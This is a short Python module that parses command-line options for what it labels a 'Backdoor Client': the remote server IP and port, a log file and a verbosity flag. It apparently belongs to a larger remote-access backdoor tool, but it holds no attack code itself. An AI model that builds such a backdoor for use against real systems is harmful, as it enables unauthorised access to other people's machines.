import argparse


def mg_arg(default_server_ip):
    parser = argparse.ArgumentParser(description='Backdoor Client Fonction')
    parser.add_argument('-p', '--RPORT', help='Set the port of the server (default=5001)', type=int, default=5001)
    parser.add_argument('-ip', '--RHOST', help='Set the ip of the remote server', type=str,
                        default=default_server_ip)

    parser.add_argument('-l', '--logName', help='Set the server logging file', type=str, default="logFile.log")
    parser.add_argument('-nv', '--notverbose', action="store_true", default=False, help="Disable verbose mode")

    args = parser.parse_args()
    return args
